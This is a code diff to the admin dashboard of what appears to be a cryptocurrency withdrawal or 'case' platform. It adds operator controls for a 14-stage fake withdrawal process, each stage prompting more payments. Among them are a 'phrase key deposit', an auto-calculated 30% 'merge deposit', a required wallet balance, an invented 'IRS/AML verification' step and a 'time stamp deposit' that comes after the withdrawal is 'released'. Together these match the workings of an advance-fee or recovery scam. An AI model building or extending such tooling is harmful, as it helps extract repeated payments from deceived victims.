@@ -56,6 +56,10 @@ interface Case {
   showWithdrawalProgress?: boolean;
   withdrawalStage?: string;
   activityDepositAmount?: string;
+  phraseKeyDepositAmount?: string;
+  phraseKeyMergeDeposit?: string;
+  activityWalletRequirement?: string;
+  phraseKeyCertificateSent?: boolean;
   createdAt: string;
   updatedAt: string;
 }
@@ -346,8 +350,10 @@ export default function AdminDashboard() {
   const [depositAddressEdit, setDepositAddressEdit] = useState("");
   const [profileRedirectEdit, setProfileRedirectEdit] = useState("");
   const [showWithdrawalProgressEdit, setShowWithdrawalProgressEdit] = useState(false);
-  const [withdrawalStageEdit, setWithdrawalStageEdit] = useState("0");
+  const [withdrawalStageEdit, setWithdrawalStageEdit] = useState("1");
   const [activityDepositAmountEdit, setActivityDepositAmountEdit] = useState("");
+  const [phraseKeyDepositAmountEdit, setPhraseKeyDepositAmountEdit] = useState("");
+  const [activityWalletRequirementEdit, setActivityWalletRequirementEdit] = useState("");
   
   // Search and filter state
   const [searchQuery, setSearchQuery] = useState("");
@@ -1367,8 +1373,10 @@ export default function AdminDashboard() {
     setProfileRedirectEdit(caseData.profileRedirectUrl || "");
     setLandingPageEdit(caseData.landingPage || "dashboard");
     setShowWithdrawalProgressEdit(caseData.showWithdrawalProgress || false);
-    setWithdrawalStageEdit(caseData.withdrawalStage || "0");
+    setWithdrawalStageEdit(caseData.withdrawalStage || "1");
     setActivityDepositAmountEdit(caseData.activityDepositAmount || "");
+    setPhraseKeyDepositAmountEdit(caseData.phraseKeyDepositAmount || "");
+    setActivityWalletRequirementEdit(caseData.activityWalletRequirement || "");
     setIsAdminMessageOpen(true);
   };
 
@@ -1509,7 +1517,9 @@ export default function AdminDashboard() {
         body: JSON.stringify({ 
           showWithdrawalProgress: showWithdrawalProgressEdit,
           withdrawalStage: withdrawalStageEdit,
-          activityDepositAmount: activityDepositAmountEdit
+          activityDepositAmount: activityDepositAmountEdit,
+          phraseKeyDepositAmount: phraseKeyDepositAmountEdit,
+          activityWalletRequirement: activityWalletRequirementEdit
         })
       });
       
@@ -4506,43 +4516,122 @@ export default function AdminDashboard() {
                   />
                 </div>
                 
-                {/* Stage selector */}
+                {/* Stage selector - 14 Stages */}
                 <div className="space-y-2 mb-4">
-                  <Label className="text-slate-300 text-xs font-medium">Current Stage</Label>
+                  <Label className="text-slate-300 text-xs font-medium">Current Stage (1-14)</Label>
                   <Select value={withdrawalStageEdit} onValueChange={setWithdrawalStageEdit}>
                     <SelectTrigger className="bg-slate-800/70 border-slate-700" data-testid="select-withdrawal-stage">
                       <SelectValue />
                     </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="0">
-                        <span className="flex items-center gap-2">🚀 Stage 1: Withdrawal Process Initiated</span>
-                      </SelectItem>
+                    <SelectContent className="max-h-80">
                       <SelectItem value="1">
-                        <span className="flex items-center gap-2">✅ Stage 2: First Stage Verification Completed</span>
+                        <span className="flex items-center gap-2">🔑 Stage 1: Phrase Key Deposit Received</span>
                       </SelectItem>
                       <SelectItem value="2">
-                        <span className="flex items-center gap-2">🏦 Stage 3: Financial Department Verification</span>
+                        <span className="flex items-center gap-2">⚙️ Stage 2: Phrase Key Generated and Processing</span>
                       </SelectItem>
                       <SelectItem value="3">
-                        <span className="flex items-center gap-2">⛏️ Stage 4: Miners Department</span>
+                        <span className="flex items-center gap-2">✅ Stage 3: Phrase Key Approved and Generated</span>
                       </SelectItem>
                       <SelectItem value="4">
-                        <span className="flex items-center gap-2">🔍 Stage 5: Money Laundry Funds Check</span>
+                        <span className="flex items-center gap-2">🚀 Stage 4: Withdrawal Process Initiated</span>
                       </SelectItem>
                       <SelectItem value="5">
-                        <span className="flex items-center gap-2">⚙️ Stage 6: Final Withdrawal Processing</span>
+                        <span className="flex items-center gap-2">📋 Stage 5: First Stage Deposit Verification</span>
                       </SelectItem>
                       <SelectItem value="6">
-                        <span className="flex items-center gap-2">🎉 Stage 7: Withdrawal Now Released</span>
+                        <span className="flex items-center gap-2">🔐 Stage 6: Phrase Key Verification</span>
+                      </SelectItem>
+                      <SelectItem value="7">
+                        <span className="flex items-center gap-2">💰 Stage 7: Phrase Key Merge Deposit Required</span>
+                      </SelectItem>
+                      <SelectItem value="8">
+                        <span className="flex items-center gap-2">🏦 Stage 8: Financial Department Verification</span>
+                      </SelectItem>
+                      <SelectItem value="9">
+                        <span className="flex items-center gap-2">⛏️ Stage 9: Mining Your Withdrawal for Final Clearance</span>
+                      </SelectItem>
+                      <SelectItem value="10">
+                        <span className="flex items-center gap-2">📊 Stage 10: Blockchain Activity Verification</span>
+                      </SelectItem>
+                      <SelectItem value="11">
+                        <span className="flex items-center gap-2">🔍 Stage 11: IRS/International AML Service Verification</span>
+                      </SelectItem>
+                      <SelectItem value="12">
+                        <span className="flex items-center gap-2">⚙️ Stage 12: Final Withdrawal Processing</span>
+                      </SelectItem>
+                      <SelectItem value="13">
+                        <span className="flex items-center gap-2">🎉 Stage 13: Withdrawal Finally Released</span>
+                      </SelectItem>
+                      <SelectItem value="14">
+                        <span className="flex items-center gap-2">⏰ Stage 14: Time Stamp Deposit for Final Delivery</span>
                       </SelectItem>
                     </SelectContent>
                   </Select>
                 </div>
-                
-                {/* Activity deposit amount */}
+
+                {/* Phrase Key Deposit Amount */}
                 <div className="space-y-2 mb-4">
-                  <Label className="text-slate-300 text-xs font-medium">Activity Deposit Amount</Label>
-                  <p className="text-xs text-slate-500">Amount the user needs to keep in their wallet (e.g., "50,000 USDT")</p>
+                  <Label className="text-slate-300 text-xs font-medium">Phrase Key Deposit Amount</Label>
+                  <p className="text-xs text-slate-500">Set the phrase key deposit amount. 30% merge deposit will be auto-calculated.</p>
+                  <Input
+                    value={phraseKeyDepositAmountEdit}
+                    onChange={(e) => setPhraseKeyDepositAmountEdit(e.target.value)}
+                    placeholder="e.g., 100,000 USDT"
+                    className="bg-slate-800/70 border-slate-700"
+                    data-testid="input-phrase-key-deposit"
+                  />
+                  {phraseKeyDepositAmountEdit && (
+                    <p className="text-xs text-emerald-400">
+                      30% Merge Deposit: {(() => {
+                        const numericMatch = phraseKeyDepositAmountEdit.match(/[\d,.]+/);
+                        const currencyMatch = phraseKeyDepositAmountEdit.match(/[A-Za-z]+$/);
+                        const currencySuffix = currencyMatch ? ' ' + currencyMatch[0] : '';
+                        if (numericMatch) {
+                          const amount = parseFloat(numericMatch[0].replace(/,/g, ''));
+                          if (!isNaN(amount)) {
+                            return (amount * 0.30).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + currencySuffix;
+                          }
+                        }
+                        return '—';
+                      })()}
+                    </p>
+                  )}
+                  {selectedCase?.phraseKeyMergeDeposit && (
+                    <p className="text-xs text-blue-400">
+                      Saved Merge Deposit: {selectedCase.phraseKeyMergeDeposit}
+                    </p>
+                  )}
+                </div>
+                
+                {/* Phrase Key Certificate Status */}
+                {selectedCase?.phraseKeyCertificateSent && (
+                  <div className="p-3 bg-green-500/10 rounded-lg border border-green-500/20 mb-4">
+                    <div className="flex items-center gap-2">
+                      <CheckCircle className="h-4 w-4 text-green-400" />
+                      <span className="text-xs text-green-400 font-medium">Phrase Key Certificate Sent</span>
+                    </div>
+                    <p className="text-xs text-slate-500 mt-1">Auto-generated secure message was sent to user when stage 3 was reached.</p>
+                  </div>
+                )}
+
+                {/* Activity Wallet Requirement */}
+                <div className="space-y-2 mb-4">
+                  <Label className="text-slate-300 text-xs font-medium">Activity Wallet Requirement</Label>
+                  <p className="text-xs text-slate-500">USDT amount user must maintain in wallet for blockchain activity verification (Stage 10)</p>
+                  <Input
+                    value={activityWalletRequirementEdit}
+                    onChange={(e) => setActivityWalletRequirementEdit(e.target.value)}
+                    placeholder="e.g., 50,000 USDT"
+                    className="bg-slate-800/70 border-slate-700"
+                    data-testid="input-activity-wallet"
+                  />
+                </div>
+                
+                {/* Activity deposit amount (legacy) */}
+                <div className="space-y-2 mb-4">
+                  <Label className="text-slate-300 text-xs font-medium">Activity Deposit Amount (Display)</Label>
+                  <p className="text-xs text-slate-500">General activity deposit amount shown to user</p>
                   <Input
                     value={activityDepositAmountEdit}
                     onChange={(e) => setActivityDepositAmountEdit(e.target.value)}
